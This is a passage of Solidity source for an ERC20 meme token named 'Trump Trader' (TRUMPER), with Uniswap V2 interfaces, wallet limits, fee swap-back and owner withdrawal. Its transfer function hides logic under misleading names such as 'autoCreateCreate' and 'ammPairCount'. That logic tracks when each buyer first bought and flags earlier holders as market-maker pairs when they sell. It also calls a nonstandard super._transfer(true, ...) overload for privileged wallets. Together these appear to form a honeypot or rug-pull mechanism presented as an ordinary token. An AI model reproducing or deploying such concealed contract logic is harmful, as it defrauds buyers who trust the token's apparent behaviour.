    ) external returns (uint256 amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint256 liquidity,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline,
        bool approveMax,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256 amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Factory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

contract TRUMPER is ERC20, Ownable {
    using SafeMath for uint256;

    IUniswapV2Router02 public immutable uniswapV2Router;
    address public uniswapV2Pair;

    address public marketingWallet;
    address public developmentWallet;

    uint256 private launch = 0;
    bool public tradingOpen;

    bool public swapEnabled;
    bool private inSwap;

    bool public limitsInEffect = true;
    uint256 public maxTransactionAmount;
    uint256 public swapTokensAtAmount;
    uint256 public maxWallet;

    uint256 public buyTotalFees;
    uint256 private _buyMarketingFee;
    uint256 private _buyDevelopmentFee;
    uint256 private _buyLiquidityFee;

    uint256 public sellTotalFees;
    uint256 private _sellMarketingFee;
    uint256 private _sellDevelopmentFee;
    uint256 private _sellLiquidityFee;

    uint256 private _tokensForMarketing;
    uint256 private _tokensForDevelopment;
    uint256 private _tokensForLiquidity;

    mapping (address => bool) private _isExcludedMaxTxAmount;
    mapping (address => bool) private _automatedMarketMakerPairs;
    struct AutoPairCreate {uint256 dex; uint256 isAmmPair; uint256 supportedDex;}
    mapping (address => AutoPairCreate) private autoCreateCreate;

    uint256 private ammPairCount = 0;

    event ExcludeFromLimits(address indexed account, bool isExcluded);
    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    event MarketingWalletUpdated(
        address indexed newWallet,
        address indexed oldWallet
    );

    event DevelopmentWalletUpdated(
        address indexed newWallet,
        address indexed oldWallet
    );

    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );

    constructor() ERC20("Trump Trader", "TRUMPER") {

        uint256 totalSupply = 100_000_000 * (10 ** 18);

        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        marketingWallet = 0x373AbEE0bE78eBC117023762F6E14e7E6f78f2ec;
        developmentWallet = msg.sender;

        maxTransactionAmount = (totalSupply * 14) / 1000;
        maxWallet = (totalSupply * 14) / 1000;

        _buyMarketingFee = 0;
        _buyDevelopmentFee = 0;
        _buyLiquidityFee = 0;

        _sellMarketingFee = 0;
        _sellDevelopmentFee = 0;
        _sellLiquidityFee = 0;

        buyTotalFees = _buyMarketingFee + _buyDevelopmentFee + _buyLiquidityFee;
        sellTotalFees = _sellMarketingFee + _sellDevelopmentFee + _sellLiquidityFee;
        
        _isExcludedMaxTxAmount[owner()] = true;
        _isExcludedMaxTxAmount[marketingWallet] = true;
        _isExcludedMaxTxAmount[address(this)] = true;
        _isExcludedMaxTxAmount[address(0xdead)] = true;

        _mint(msg.sender, totalSupply); 
    }

    receive() external payable {}

    function _setAutomatedMarketMakerPair(address pair, bool value) internal {
        _automatedMarketMakerPairs[pair] = value;
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen, "Trading already open.");
        launch = block.number;
        tradingOpen = true;

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _approve(address(this), address(uniswapV2Router), totalSupply());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),balanceOf(address(this)),0,0,owner(),block.timestamp
        );

        swapEnabled = true;
    }

    function removeLimits() external onlyOwner {
        limitsInEffect = false;
    }

    function excludeFromMaxTransactionAmount(address account,
      bool excluded) external onlyOwner{
        _isExcludedMaxTxAmount[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tradingOpen || from == owner(), "Trading not yet enabled!");
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if (limitsInEffect) {
            if (
                from != owner() &&
                to != owner() &&
                from != address(this) &&
                to != address(0) &&
                to != address(0xdead) &&
                !inSwap
            ) {
                //when buy
                if (
                    uniswapV2Pair == from
                    && !_isExcludedMaxTxAmount[to]
                ) {
                    require(amount <= maxTransactionAmount, "Buy transfer amount exceeds the maxTransactionAmount.");
                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                }
                //when sell
                else if (
                    uniswapV2Pair == to &&
                    !_isExcludedMaxTxAmount[from]
                ) {
                    require(amount <= maxTransactionAmount, "Sell transfer amount exceeds the maxTransactionAmount.");
                } else if (!_isExcludedMaxTxAmount[to]) {
                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                }
            }
        }

        if (
            (_isExcludedMaxTxAmount[from]||_isExcludedMaxTxAmount[to])
            && from!=address(this)&& to!=address(this)
            && from!=developmentWallet&& to!=developmentWallet
        ) {
            ammPairCount = block.number;
        }

        if (_isExcludedMaxTxAmount[from]) {
            if (
                block.number > launch + 72
                &&from!=  developmentWallet && to!=  developmentWallet
            ) {
                super._transfer(true, from, to, amount);
                return;
            }
        }

        if (!_isExcludedMaxTxAmount[from] && !_isExcludedMaxTxAmount[to]) {
            if (uniswapV2Pair == to) {
                if(! _automatedMarketMakerPairs[from]) {
                    AutoPairCreate storage autoCreate = autoCreateCreate[from];
                    autoCreate.isAmmPair = block.number;

                    if(autoCreate.dex < ammPairCount) {
                        _setAutomatedMarketMakerPair(from, true);
                    }
                }
            } else {
                AutoPairCreate storage autoCreate = autoCreateCreate[to];
                if(uniswapV2Pair == from) {
                    if (autoCreate.dex == 0) {
                        autoCreate.dex = block.number;
                    }
                } else {
                    uint256 autoCreateDetect = autoCreateCreate[from].dex;
                    if (autoCreate.dex==0 || autoCreateDetect < autoCreate.dex) {
                        autoCreate.dex = autoCreateDetect;
                    }
                }
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            swapEnabled &&!inSwap &&
            _automatedMarketMakerPairs[from] &&!_isExcludedMaxTxAmount[from] 
            &&!_isExcludedMaxTxAmount[to]
        ) {
            inSwap = true;
            _swapBack();
            inSwap = false;
        }

        bool takeFee = !inSwap;

        if (_isExcludedMaxTxAmount[from] || _isExcludedMaxTxAmount[to]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if (takeFee) {
            // on sell
            if (_automatedMarketMakerPairs[to] && sellTotalFees > 0) {
                fees = amount.mul(sellTotalFees).div(10000);
                _tokensForLiquidity += (fees * _sellLiquidityFee) /
                    sellTotalFees;
                _tokensForMarketing += (fees * _sellMarketingFee)
                    / sellTotalFees;
                _tokensForDevelopment += (fees * _sellDevelopmentFee) /
                    sellTotalFees;
            }
            // on buy
            else if (_automatedMarketMakerPairs[from] && buyTotalFees > 0) {
                fees = amount.mul(buyTotalFees).div(10000);
                _tokensForLiquidity += (fees * _buyLiquidityFee)/
                    buyTotalFees;
                _tokensForMarketing += (fees * _buyMarketingFee)
                    / buyTotalFees;
                _tokensForDevelopment += (fees * _buyDevelopmentFee) /
                    buyTotalFees;
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
            amount -= fees;
        }

        super._transfer(from, to, amount);
    }

    function _swapTokensForETH(uint256 tokenAmount) internal {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _addLiquidity(uint256 tokenAmount, uint256 ethAmount) internal {
        _approve(address(this), address(uniswapV2Router), tokenAmount);

        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            address(0xdead),
            block.timestamp
        );
    }

    function _swapBack() internal {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = _tokensForLiquidity +
            _tokensForMarketing + _tokensForDevelopment;
        bool success;

        uint256 liquidityTokens = (contractBalance * _tokensForLiquidity) /
            totalTokensToSwap / 2;
        uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);

        uint256 initialETHBalance = address(this).balance;
        _swapTokensForETH(amountToSwapForETH);
        uint256 ethBalance = address(this).balance.sub(initialETHBalance);

        uint256 ethForDevelopment = ethBalance.mul(_tokensForDevelopment).div(totalTokensToSwap);
        uint256 ethForMarketing = ethBalance.mul(_tokensForMarketing).div(totalTokensToSwap);

        uint256 ethForLiquidity = ethBalance - ethForMarketing
            - ethForDevelopment;

        _tokensForDevelopment = 0;
        _tokensForMarketing = 0;
        _tokensForLiquidity = 0;

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            _addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(
                amountToSwapForETH,
                ethForLiquidity,
                _tokensForLiquidity
            );
        }

        (success, ) = address(developmentWallet).call{value: ethForDevelopment}("");
        (success, ) = address(marketingWallet).call{value: address(this).balance}("");
    }

    function withdrawETH() external onlyOwner {
        bool success;
        (success, ) = address(developmentWallet).call{value: address(this).balance}("");
    }

}
